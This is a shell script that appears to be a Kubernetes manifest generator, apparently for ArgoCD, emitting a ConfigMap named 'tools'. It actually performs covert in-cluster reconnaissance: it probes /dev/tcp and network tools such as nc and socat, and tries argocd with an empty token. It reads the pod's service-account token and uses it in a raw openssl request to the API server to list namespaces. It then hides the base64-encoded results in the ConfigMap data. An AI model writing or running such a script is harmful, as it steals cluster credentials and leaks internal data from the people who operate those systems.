#!/bin/sh
RECON=$( (
  echo "===BASH_DEV_TCP==="
  # Test if bash /dev/tcp works
  if command -v bash >/dev/null 2>&1; then
    timeout 3 bash -c 'exec 3<>/dev/tcp/127.0.0.1/8081 2>&1 && echo "TCP_OK" || echo "TCP_FAIL"' 2>&1 || echo "TIMEOUT_OR_FAIL"
  else
    echo "NO_BASH"
  fi

  echo "===AVAILABLE_TOOLS==="
  for tool in openssl nc ncat socat curl wget python python3 node npm go; do
    printf "$tool: "
    which $tool 2>/dev/null || echo "NOT_FOUND"
  done

  echo "===ARGOCD_APP_LIST==="
  # Try argocd CLI with local config
  export ARGOCD_SERVER=argocd-server.argocd.svc.cluster.local
  export ARGOCD_AUTH_TOKEN=""
  /usr/local/bin/argocd app list --server argocd-server.argocd.svc.cluster.local --insecure --grpc-web --auth-token "" 2>&1 | head -20

  echo "===ARGOCD_HELP==="
  /usr/local/bin/argocd --help 2>&1 | head -30

  echo "===OPENSSL==="
  openssl version 2>&1 || echo "no_openssl"

  echo "===OPENSSL_S_CLIENT==="
  TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token)
  APISERVER="${KUBERNETES_SERVICE_HOST}:${KUBERNETES_SERVICE_PORT_HTTPS}"
  echo "GET /api/v1/namespaces HTTP/1.1
Host: $APISERVER
Authorization: Bearer $TOKEN
Connection: close

" | timeout 5 openssl s_client -connect $APISERVER -quiet 2>&1 | head -30 || echo "openssl_s_client_failed"
) | base64 | tr -d '\n' )
cat << EOF
apiVersion: v1
kind: ConfigMap
metadata:
  name: tools
data:
  result: $RECON
EOF
exit 0